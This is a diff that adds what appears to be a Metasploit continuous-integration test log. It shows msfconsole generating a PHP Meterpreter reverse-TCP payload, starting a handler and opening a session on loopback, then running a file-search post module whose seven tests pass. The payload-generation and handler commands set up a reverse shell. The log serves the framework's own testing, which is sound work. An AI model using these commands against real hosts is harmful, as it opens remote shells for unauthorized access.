@@ -1,0 +1,32 @@
+use php/meterpreter/reverse_tcp
+Stopping all jobs...
+msf6 post(test/registry) > generate -o D:/a/_temp/meterpreter-spec-rb-php-meterpreter-reverse-tcp20220128-6448-nuq9t9.php -f raw lport=6044 lhost=127.0.0.1
+msf6 payload(php/meterpreter/reverse_tcp) > [*] Writing 1110 bytes to D:/a/_temp/meterpreter-spec-rb-php-meterpreter-reverse-tcp20220128-6448-nuq9t9.php...
+msf6 payload(php/meterpreter/reverse_tcp) > to_handler
+[*] Payload Handler Started as Job 40
+msf6 payload(php/meterpreter/reverse_tcp) > 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6044 
+[*] Sending stage (39282 bytes) to 127.0.0.1
+[*] Meterpreter session 41 opened (127.0.0.1:6044 -> 127.0.0.1:50223 ) at 2022-01-28 22:56:01 +0000
+use test/search
+msf6 post(test/search) > run session=41 addentropy=true verbose=true
+[*] Setup: changing working directory to C:\Users\RUNNER~1\AppData\Local\Temp
+[*] Source File Name: meterpreter-test-dgmabrje.txt
+[*] Running against session 41
+[*] Session type is meterpreter and platform is windows
+[*] Starting search tests
+[+] should search for new files
+[+] should search recursively for files
+[+] should search with globs for files
+[+] should search with globs ignoring files
+[*] Starting search date tests
+[+] should search with dates for files
+[+] should search with dates ignores new files
+[+] should search with dates ignores old files
+[*] Session does not support setting the modified date, skipping exact date tests
+[*] Testing complete in 0.1228056
+[*] Passed: 7; Failed: 0
+[*] Cleanup: changing working directory back to D:\a\metasploit-framework\metasploit-framework
+[*] Post module execution completed
+msf6 post(test/search) > 
